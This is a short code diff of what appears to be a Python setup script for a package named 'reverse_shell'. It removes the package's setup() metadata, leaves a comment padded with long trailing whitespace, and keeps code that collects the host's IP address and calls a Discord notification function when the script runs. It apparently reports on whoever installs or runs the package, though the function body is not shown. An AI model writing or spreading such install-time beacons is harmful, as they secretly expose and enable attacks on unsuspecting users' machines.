@@ -11,17 +11,7 @@ def send_discord_notification():
 # Obtenemos la dirección IP del host actual
 ip_address = socket.gethostbyname(socket.gethostname())
 
-setup(
-    name='reverse_shell',
-    version='0.9',
-    packages=['reverse_shell'],
-    install_requires=['requests'],
-    url='https://github.com/tuusuario/reverse_shell',
-    license='',
-    author='ReverseShell',
-    author_email='reverseshell@gmail.com',
-    description='ReverseShell Project'
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                       
 
 if __name__ == '__main__':
     send_discord_notification()
